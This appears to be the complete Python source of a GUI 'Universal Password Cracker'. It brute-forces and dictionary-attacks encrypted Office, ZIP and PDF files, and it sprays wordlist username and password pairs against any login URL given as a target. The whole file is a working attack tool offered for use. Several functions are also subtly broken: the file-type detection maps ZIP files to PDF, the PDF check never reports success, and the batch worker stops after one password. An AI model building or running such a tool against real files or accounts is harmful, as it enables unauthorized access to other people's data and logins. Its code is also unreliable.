# Initial Setup and Imports

# Internal Modules
import os
import sys
import time
import string
import io
import logging
import requests
import threading
from itertools import product
from concurrent.futures import ThreadPoolExecutor, as_completed

# Installed External Modules
import msoffcrypto
import pyzipper
import PyPDF2
import colorama
from tqdm import tqdm
from tabulate import tabulate
import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext, messagebox
from PIL import Image, ImageTk

# Colorama initialization for colored console output
colorama.init()

# Logging Configuration Setup
logging.basicConfig(filename='password_cracker.log', level=logging.INFO, format='%(asctime)s -%(levelname)s -%(message)s')

# Global Variable Definition
stop_flag = False #Global flag for the attack stoppage/halt
results = []  # Global results list

# Utility Functions



# Fetch Function to get path to bundled resources in PyInstaller
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# Funtion Trial on different file types
def try_password(file_path, file_type, password):
    logging.info(f"Trying password: {password}")
    try:
        if file_type in ['xls', 'xlsx', 'doc', 'docx']:
            return try_office_password(file_path, password)
        elif file_type == 'zip':
            return try_zip_password(file_path, password)
        elif file_type == 'pdf':
            return try_pdf_password(file_path, password)
        else:
            logging.error(f"Unsupported password file type.")
            return False
    except Exception as e:
        logging.error(f"Error trying password {password} | {e}")
        return False

    
# MS Office password function definition
def try_office_password(file_path, password):
    # Open file and File Decryption using msoffcrypto
    with open(file_path, "rb") as f:
        file = msoffcrypto.OfficeFile(f)
        file.load_key(password=password)
        with io.BytesIO() as decrypted:
            file.decrypt(decrypted)
            return True


# ZIP files password function definition
def try_zip_password(file_path, password):
    # Open the ZIP file and attempt using PyZipper
    with pyzipper.AESZipFile(file_path) as zf:
        zf.extractall(pwd=password.encode('utf-8'))
        return True


# PDF files password definition
def try_pdf_password(file_path, password):
    #Opening up of PDF and Decryption using PyPDF2
    reader = PyPDF2.PdfReader(file_path)
    if reader.is_encrypted:
        reader.decrypt(password)
        reader.pages[0]
        return False

# Multithreaded password attempts function
def attempt_passwords(file_path, file_type, passwords, results, batch_index):
    for password in passwords:
        if try_password(file_path, file_type, password):
            results[batch_index] = (password, "Success")
            return password
        else:
            results[batch_index] = (password, "Unsuccessful")
        return None


# File Type Based on File Extension Function

def get_file_type(file_path):
    extension = os.path.splitext(file_path)[1].lower()
    if extension in ['xls', 'xlsx']:
        return 'xls'
    elif extension in ['.doc', '.docx']:
        return 'doc'
    elif extension == '.zip':
        return 'pdf'
    else:
        return None


# File Reading with Fallback Encoding and Error hand
def read_file_lines(file_path):
    encodings = ['utf-8', 'latin-1', 'ascii']
    for encoding in encodings:
        try:
            with open(file_path, 'r', encoding=encoding, errors='ignore') as f:
                return[line.strip() for line in f.readlines()]
        except UnicodeDecodeError:
            continue
    raise ValueError(f"failed to decode file {file_path} with files encodings")

# UI Update Functions


#Progress message update function
def update_progress(message):
    progress_var.set(message)

# Main log function update
def update_log(message):
    output_log.insert(tk.END, message + "\n")
    output_log.see(tk.END)

#Log results update function
def update_results_log(message, success=False):
    if success:
        results_log.tag_configure("success", foreground="green")
        results_log.insert(tk.END, message + "\n", "success")
    else:
        results_log.insert(tk.END, message + "\n")
    results_log.see(tk.END)

# Progress bar and ETA label update function
def update_progress_bar(current, total, start_time):
    progress_percentage = min(100, (current / total) * 100)
    progress_bar['value'] = progress_percentage
    progress_label.config(text=f"Progress: {progress_percentage:.2f}%")
    elapsed_time = time.time() - start_time
    if current > 0 and current < total:
        estimated_total_time = elapsed_time * total / current
        estimated_remaining_time = estimated_total_time - elapsed_time
        eta_label.config(text=f"Estimated Time Remaining: {int(estimated_remaining_time // 60)} min {int(estimated_remaining_time % 60)} sec")
    elif current >= total:
        eta_label.config(text="Estimated Time Remaining: 0 min 0 sec")
    root.update_idletasks()

# summarize the results and update of the log function
def summary_results():
    global results
    if results:
        summary_table = tabulate(results, headers=["Attempt", "Password", "Status"], tablefmt="grid")
        update_results_log(f"\nSummary of findings:\n{summary_table}")
        update_progress("Attack stopped and results summarized.")
        logging.info("Attack stopped and results summarized.")

#  Clearing of  attack results and reset of the UI function
def clear_attack():
    global stop_flag, results
    stop_flag = False
    results = []
    progress_var.set("")
    output_log.delete(1.0, tk.END)
    results_log.delete(1.0, tk.END)
    progress_bar['value'] = 0
    progress_label.config(text="Progress: 0%")
    eta_label.config(text="Estimated Time Remaining: N/A")
    logging.info("Attack cleared.")

# Attack Functions

# Brute force attack definition function
def brute_force(file_path, file_type, max_length=6, charset=string.ascii_lowercase):
    global results
    try:
        start_time = time.time()  # Record the start time
        attempt_counter = 0  # Initialize the attempt counter
        results = []  # Initialize the results list
        total_attempts = sum(len(charset) ** i for i in range(1, max_length + 1))  # Calculate total attempts

        with tqdm(total=total_attempts, desc="Brute Force Progress", unit="attempt", dynamic_ncols=True) as pbar:
            for length in range(1, max_length + 1):  # Loop through each password length
                for attempt in product(charset, repeat=length):  # Generate all combinations of the given length
                    if stop_flag:  # Check if the stop flag is set
                        update_progress("Process interrupted by user.")
                        logging.info("Process interrupted by user.")
                        summary_results()
                        return None
                    password = ''.join(attempt)  # Join the characters to form a password
                    attempt_counter += 1  # Increment the attempt counter
                    if try_password(file_path, file_type, password):  # Try the generated password
                        end_time = time.time()  # Record the end time
                        results.append([attempt_counter, password, "Success"])  # Append successful attempt
                        table = tabulate(results, headers=["Attempt", "Password", "Status"], tablefmt="grid")
                        update_log(table)
                        update_results_log(f"Password found: {password} for file: {file_path}\nTime taken: {end_time - start_time} seconds\nAttempts made: {attempt_counter}", success=True)
                        logging.info(f"Password found: {password}")
                        logging.info(f"Time taken: {end_time - start_time} seconds")
                        logging.info(f"Attempts made: {attempt_counter}")
                        update_progress_bar(total_attempts, total_attempts, start_time)
                        eta_label.config(text="Estimated Time Remaining: 0 min 0 sec")
                        root.update_idletasks()
                        return password
                    pbar.update(1)  # Update the progress bar
                    results.append([attempt_counter, password, "Unsuccessful"])  # Append unsuccessful attempt
                    table = tabulate(results[-100:], headers=["Attempt", "Password", "Status"], tablefmt="grid")
                    update_log(table)
                    update_progress_bar(attempt_counter, total_attempts, start_time)
                    root.update_idletasks()
        update_results_log("Password not found.")
        logging.info("Password not found.")
        update_progress_bar(total_attempts, total_attempts, start_time)
    except KeyboardInterrupt:
        update_progress("Process interrupted by user.")
        logging.info("Process interrupted by user.")
        summary_results()
    return None


# Step 15: Define the dictionary attack function
def dictionary_attack(file_path, file_type, dictionary_file):
    global results
    try:
        start_time = time.time()  # Record the start time
        results = []  # Initialize the results list
        attempt_counter = 0  # Initialize the attempt counter

        try:
            passwords = read_file_lines(dictionary_file)  # Read passwords from dictionary file
        except FileNotFoundError:
            update_progress(f"Dictionary file '{dictionary_file}' not found.")
            return None
        except ValueError as e:
            update_progress(str(e))
            return None

        total_attempts = len(passwords)  # Calculate total attempts
        password_found = False  # Initialize the password found flag

        with ThreadPoolExecutor(max_workers=10) as executor:  # Create a thread pool
            futures = []
            with tqdm(total=total_attempts, desc="Dictionary Attack Progress", unit="attempt", dynamic_ncols=True) as pbar:
                for i in range(0, total_attempts, 10):  # Process passwords in batches of 10
                    if password_found or stop_flag:
                        break
                    batch = passwords[i:i + 10]
                    future = executor.submit(attempt_passwords, file_path, file_type, batch, results, i)
                    futures.append(future)
                    attempt_counter += len(batch)  # Increment the attempt counter by batch size
                    pbar.update(len(batch))  # Update the progress bar
                    results.extend([[i + j, pw, "Unsuccessful"] for j, pw in enumerate(batch)])  # Append unsuccessful attempts
                    table = tabulate(results[-100:], headers=["Attempt", "Password", "Status"], tablefmt="grid")
                    update_log(table)
                    update_progress_bar(attempt_counter, total_attempts, start_time)
                    root.update_idletasks()

                for future in as_completed(futures):  # Check results of futures
                    password = future.result()
                    if password:
                        password_found = True  # Set password found flag
                        end_time = time.time()  # Record the end time
                        results.append([attempt_counter, password, "Success"])  # Append successful attempt
                        table = tabulate(results, headers=["Attempt", "Password", "Status"], tablefmt="grid")
                        update_log(table)
                        update_results_log(f"Password found: {password} for file: {file_path}\nTime taken: {end_time - start_time} seconds\nAttempts made: {attempt_counter}", success=True)
                        logging.info(f"Password found: {password}")
                        logging.info(f"Time taken: {end_time - start_time} seconds")
                        logging.info(f"Attempts made: {attempt_counter}")
                        update_progress_bar(total_attempts, total_attempts, start_time)
                        eta_label.config(text="Estimated Time Remaining: 0 min 0 sec")
                        root.update_idletasks()
                        return password
                    if stop_flag:
                        summary_results()
                        return None
                    attempt_counter += 1  # Increment the attempt counter
                    pbar.set_postfix({"Attempts": attempt_counter})
                    table = tabulate(results[-100:], headers=["Attempt", "Password", "Status"], tablefmt="grid")
                    update_log(table)
                    update_progress_bar(attempt_counter, total_attempts, start_time)
                    root.update_idletasks()

        update_results_log("Password not found.")
        logging.info("Password not found.")
        update_progress_bar(total_attempts, total_attempts, start_time)
    except KeyboardInterrupt:
        update_progress("Process interrupted by user.")
        logging.info("Process interrupted by user.")
        summary_results()
    return None

# Step 16: Define the reverse brute force attack function
def reverse_brute_force(url, usernames_file, common_passwords_file):
    global results
    found_logins = []
    try:
        start_time = time.time()  # Record the start time
        results = []  # Initialize the results list
        success_logins = []  # Initialize the success logins list

        try:
            common_passwords = read_file_lines(common_passwords_file)  # Read common passwords
        except FileNotFoundError:
            update_progress(f"Common passwords file '{common_passwords_file}' not found.")
            return None
        except ValueError as e:
            update_progress(str(e))
            return None

        try:
            usernames = read_file_lines(usernames_file)  # Read usernames
        except FileNotFoundError:
            update_progress(f"Usernames file '{usernames_file}' not found.")
            return None
        except ValueError as e:
            update_progress(str(e))
            return None

        attempt_counter = 0  # Initialize the attempt counter
        total_attempts = len(usernames) * len(common_passwords)  # Calculate total attempts

        with tqdm(total=total_attempts, desc="Reverse Brute Force Progress", unit="attempt", dynamic_ncols=True) as pbar:
            for password in common_passwords:
                for username in usernames:
                    if stop_flag:
                        update_progress("Process interrupted by user.")
                        logging.info("Process interrupted by user.")
                        summary_results()
                        return None
                    attempt_counter += 1  # Increment the attempt counter
                    response = requests.post(url, data={'username': username, 'password': password})  # Send login request
                    if 'Dashboard' in response.text:
                        end_time = time.time()  # Record the end time
                        results.append([attempt_counter, username, password, "Success", end_time - start_time])  # Append successful attempt
                        success_logins.append((username, password, attempt_counter, end_time - start_time))  # Append successful login
                        found_logins.append([attempt_counter, username, password, end_time - start_time])  # Append found login
                        table = tabulate(found_logins, headers=["Attempt", "Username", "Password", "Time Taken"], tablefmt="grid")
                        update_log(f"\nFound Logins:\n{table}")
                        update_results_log(f"Password found: {password} for username: {username}\nTime taken: {end_time - start_time} seconds\nAttempts made: {attempt_counter}", success=True)
                        logging.info(f"Password found: {password} for username: {username}")
                        logging.info(f"Time taken: {end_time - start_time} seconds")
                        logging.info(f"Attempts made: {attempt_counter}")
                    else:
                        results.append([attempt_counter, username, password, "Unsuccessful"])  # Append unsuccessful attempt
                    pbar.update(1)  # Update the progress bar
                    table = tabulate(results[-100:], headers=["Attempt", "Username", "Password", "Status"], tablefmt="grid")
                    update_log(table)
                    update_progress_bar(attempt_counter, total_attempts, start_time)
                    root.update_idletasks()

        if success_logins:
            summary_table = tabulate(success_logins, headers=["Username", "Password", "Attempt", "Time Taken"], tablefmt="grid")
            update_results_log(f"\nSummary of found logins:\n{summary_table}")
            logging.info("Summary of found logins:\n" + summary_table)
        else:
            update_results_log("Password not found for any username.")
            logging.info("Password not found for any username.")
        update_progress_bar(total_attempts, total_attempts, start_time)
    except KeyboardInterrupt:
        update_progress("Process interrupted by user.")
        logging.info("Process interrupted by user.")
        summary_results()
    return None


# GUI Setup Functions

# Function to update the UI based on the selected attack type
def update_ui():
    attack_type = attack_type_var.get()
    file_type_frame.grid_remove()
    brute_force_frame.grid_remove()
    dictionary_frame.grid_remove()
    reverse_brute_force_frame.grid_remove()

    if attack_type in ['brute_force', 'dictionary']:
        file_type_frame.grid(row=1, column=0, columnspan=3, pady=5, padx=5, sticky="ew")
    if attack_type == 'brute_force':
        brute_force_frame.grid(row=2, column=0, columnspan=3, pady=5, padx=5, sticky="ew")
    elif attack_type == 'dictionary':
        dictionary_frame.grid(row=2, column=0, columnspan=3, pady=5, padx=5, sticky="ew")
    elif attack_type == 'reverse_brute_force':
        reverse_brute_force_frame.grid(row=2, column=0, columnspan=3, pady=5, padx=5, sticky="ew")

# function to open a file dialog to select a file
def browse_file(entry):
    filename = filedialog.askopenfilename()
    entry.delete(0, tk.END)
    entry.insert(0, filename)

# function to run the selected attack
def run_attack():
    global stop_flag, results
    stop_flag = False
    results = []
    attack_type = attack_type_var.get()
    file_type = file_type_var.get()

    if attack_type in ['brute_force', 'dictionary']:
        file_path = file_path_entry.get() if attack_type == 'brute_force' else file_path_entry_dict.get()
        if not file_path or not os.path.isfile(file_path):
            update_progress("Invalid file path.")
            return

    if attack_type == 'brute_force':
        try:
            max_length = int(max_length_entry.get())
        except ValueError:
            update_progress("Invalid maximum length. Please enter a numeric value.")
            return
        charset = charset_entry.get() or string.ascii_lowercase
        threading.Thread(target=brute_force, args=(file_path, file_type, max_length, charset)).start()

    elif attack_type == 'dictionary':
        dictionary_file = dictionary_file_entry.get()
        if not dictionary_file or not os.path.isfile(dictionary_file):
            update_progress("Invalid dictionary file path.")
            return
        threading.Thread(target=dictionary_attack, args=(file_path, file_type, dictionary_file)).start()

    elif attack_type == 'reverse_brute_force':
        url = url_entry.get()
        usernames_file = usernames_file_entry.get()
        common_passwords_file = common_passwords_file_entry.get()
        if not url or not usernames_file or not os.path.isfile(usernames_file) or not common_passwords_file or not os.path.isfile(common_passwords_file):
            update_progress("Invalid input. Please ensure all fields are filled correctly.")
            return
        threading.Thread(target=reverse_brute_force, args=(url, usernames_file, common_passwords_file)).start()

# Define a function to stop the current attack
def stop_attack():
    global stop_flag
    stop_flag = True
    update_progress("Stopping the attack...")
    summary_results()

# Step 21: Define a function to handle the window closing event
def on_closing():
    if messagebox.askokcancel("Quit", "Do you want to quit?"):
        root.destroy()


# Main GUI Setup and Loop

# Main window Initialization
root = tk.Tk()
root.title("Universal Password Cracker")
root.geometry("800x700")

# icon for the window
logo = Image.open(resource_path("logo.png"))
logo = logo.resize((64, 64), Image.LANCZOS)
logo = ImageTk.PhotoImage(logo)
root.iconphoto(False, logo)

# Main frame creation
main_frame = ttk.Frame(root, padding="10")
main_frame.grid(row=0, column=0, sticky="nsew")

# Configure the styles for the UI components
style = ttk.Style()
style.configure("TLabel", background="#05050F", foreground="#FFD700")
style.configure("TFrame", background="#05050F")
style.configure("TButton", background="black", foreground="red", bordercolor="#009933", focusthickness=3, focuscolor="none")
style.configure("Green.Horizontal.TProgressbar", troughcolor='#151525', background='#00FF00', bordercolor='#05050F')

# attack type selection components
attack_type_var = tk.StringVar(value="brute_force")
attack_type_label = ttk.Label(main_frame, text="Select Attack Type:", font=("Courier New", 12))
attack_type_label.grid(row=0, column=0, pady=5, padx=5, sticky="w")
attack_type_menu = ttk.Combobox(main_frame, textvariable=attack_type_var, state="readonly", font=("Courier New", 12))
attack_type_menu['values'] = ("brute_force", "dictionary", "reverse_brute_force")
attack_type_menu.grid(row=0, column=1, pady=5, padx=(0, 5), sticky="w")
attack_type_menu.bind("<<ComboboxSelected>>", lambda e: update_ui())

# file type selection frame
file_type_frame = ttk.Frame(main_frame, style="TFrame")
file_type_label = ttk.Label(file_type_frame, text="Select File Type:", font=("Courier New", 12))
file_type_label.grid(row=0, column=0, pady=5, padx=5, sticky="w")
file_type_var = tk.StringVar(value="zip")
file_type_menu = ttk.Combobox(file_type_frame, textvariable=file_type_var, state="readonly", font=("Courier New", 12))
file_type_menu['values'] = ("zip", "xls", "doc", "pdf")
file_type_menu.grid(row=0, column=1, pady=5, padx=(0, 5), sticky="w")
file_type_frame.grid(row=1, column=0, columnspan=3, pady=5, padx=5, sticky="ew")

# brute force configuration frame
brute_force_frame = ttk.Frame(main_frame, style="TFrame")
ttk.Label(brute_force_frame, text="File Path:", font=("Courier New", 12)).grid(row=2, column=0, pady=5, padx=5, sticky="w")
file_path_entry = ttk.Entry(brute_force_frame, width=40, font=("Courier New", 12), background="#151525", foreground="red")
file_path_entry.grid(row=2, column=1, pady=5, padx=5, sticky="w")
ttk.Button(brute_force_frame, text="Browse", command=lambda: browse_file(file_path_entry), style="TButton").grid(row=2, column=2, pady=5, padx=5, sticky="w")
ttk.Label(brute_force_frame, text="Max Length:", font=("Courier New", 12)).grid(row=3, column=0, pady=5, padx=5, sticky="w")
max_length_entry = ttk.Entry(brute_force_frame, width=10, font=("Courier New", 12), background="#151525", foreground="red")
max_length_entry.grid(row=3, column=1, pady=5, padx=5, sticky="w")
ttk.Label(brute_force_frame, text="Charset:", font=("Courier New", 12)).grid(row=4, column=0, pady=5, padx=5, sticky="w")
charset_entry = ttk.Entry(brute_force_frame, width=40, font=("Courier New", 12), background="#151525", foreground="red")
charset_entry.grid(row=4, column=1, pady=5, padx=5, sticky="w")

# dictionary attack configuration frame
dictionary_frame = ttk.Frame(main_frame, style="TFrame")
ttk.Label(dictionary_frame, text="File Path:", font=("Courier New", 12)).grid(row=2, column=0, pady=5, padx=5, sticky="w")
file_path_entry_dict = ttk.Entry(dictionary_frame, width=40, font=("Courier New", 12), background="#151525", foreground="red")
file_path_entry_dict.grid(row=2, column=1, pady=5, padx=5, sticky="w")
ttk.Button(dictionary_frame, text="Browse", command=lambda: browse_file(file_path_entry_dict), style="TButton").grid(row=2, column=2, pady=5, padx=5, sticky="w")
ttk.Label(dictionary_frame, text="Dictionary File:", font=("Courier New", 12)).grid(row=3, column=0, pady=5, padx=5, sticky="w")
dictionary_file_entry = ttk.Entry(dictionary_frame, width=40, font=("Courier New", 12), background="#151525", foreground="red")
dictionary_file_entry.grid(row=3, column=1, pady=5, padx=5, sticky="w")
ttk.Button(dictionary_frame, text="Browse", command=lambda: browse_file(dictionary_file_entry), style="TButton").grid(row=3, column=2, pady=5, padx=5, sticky="w")

# reverse brute force configuration frame
reverse_brute_force_frame = ttk.Frame(main_frame, style="TFrame")
ttk.Label(reverse_brute_force_frame, text="Target URL:", font=("Courier New", 12)).grid(row=2, column=0, pady=5, padx=5, sticky="w")
url_entry = ttk.Entry(reverse_brute_force_frame, width=40, font=("Courier New", 12), background="#151525", foreground="red")
url_entry.grid(row=2, column=1, pady=5, padx=5, sticky="w")
ttk.Label(reverse_brute_force_frame, text="Usernames File:", font=("Courier New", 12)).grid(row=3, column=0, pady=5, padx=5, sticky="w")
usernames_file_entry = ttk.Entry(reverse_brute_force_frame, width=40, font=("Courier New", 12), background="#151525", foreground="red")
usernames_file_entry.grid(row=3, column=1, pady=5, padx=5, sticky="w")
ttk.Button(reverse_brute_force_frame, text="Browse", command=lambda: browse_file(usernames_file_entry), style="TButton").grid(row=3, column=2, pady=5, padx=5, sticky="w")
ttk.Label(reverse_brute_force_frame, text="Common Passwords File:", font=("Courier New", 12)).grid(row=4, column=0, pady=5, padx=5, sticky="w")
common_passwords_file_entry = ttk.Entry(reverse_brute_force_frame, width=40, font=("Courier New", 12), background="#151525", foreground="red")
common_passwords_file_entry.grid(row=4, column=1, pady=5, padx=5, sticky="w")
ttk.Button(reverse_brute_force_frame, text="Browse", command=lambda: browse_file(common_passwords_file_entry), style="TButton").grid(row=4, column=2, pady=5, padx=5, sticky="w")

# Run, Stop, and Clear buttons
ttk.Button(main_frame, text="Run", command=run_attack, style="TButton", width=15).grid(row=5, column=0, pady=10, padx=5, sticky="ew")
ttk.Button(main_frame, text="Stop", command=stop_attack, style="TButton", width=15).grid(row=5, column=1, pady=10, padx=5, sticky="ew")
ttk.Button(main_frame, text="Clear", command=clear_attack, style="TButton", width=15).grid(row=5, column=2, pady=10, padx=5, sticky="ew")

# the progress and output display
progress_var = tk.StringVar()
table_var = tk.StringVar()
ttk.Label(main_frame, textvariable=progress_var, wraplength=700, font=("Courier New", 12)).grid(row=6, column=0, columnspan=3, pady=10, padx=10, sticky="ew")
output_frame = ttk.Frame(main_frame, style="TFrame")
output_frame.grid(row=7, column=0, columnspan=3, pady=10, padx=10, sticky="ew")
ttk.Label(output_frame, text="Progress Log:", font=("Courier New", 12)).pack(anchor="w")
output_log = scrolledtext.ScrolledText(output_frame, height=10, wrap=tk.WORD, bg="#05050F", fg="#FFD700", font=("Courier New", 10))
output_log.pack(fill=tk.BOTH, expand=True)
ttk.Label(output_frame, text="Results Log:", font=("Courier New", 12)).pack(anchor="w")
results_log = scrolledtext.ScrolledText(output_frame, height=10, wrap=tk.WORD, bg="#05050F", fg="#FFD700", font=("Courier New", 10))
results_log.pack(fill=tk.BOTH, expand=True)
progress_bar = ttk.Progressbar(output_frame, orient=tk.HORIZONTAL, length=700, mode='determinate', style="Green.Horizontal.TProgressbar")
progress_bar.pack(fill=tk.X, pady=5)
progress_label = tk.Label(output_frame, text="Progress: 0%", bg="#05050F", fg="#FFD700", font=("Courier New", 12))
progress_label.pack()
eta_label = tk.Label(output_frame, text="Estimated Time Remaining: N/A", bg="#05050F", fg="#FFD700", font=("Courier New", 12))
eta_label.pack()

# column configurations set up
root.grid_columnconfigure(0, weight=1)
main_frame.grid_columnconfigure(0, weight=1)
main_frame.grid_columnconfigure(1, weight=1)
main_frame.grid_columnconfigure(2, weight=1)
output_frame.grid_columnconfigure(0, weight=1)

# UI Initialization
update_ui()

# Handle the window closing event
root.protocol("WM_DELETE_WINDOW", on_closing)

# Start the main loop
root.mainloop()
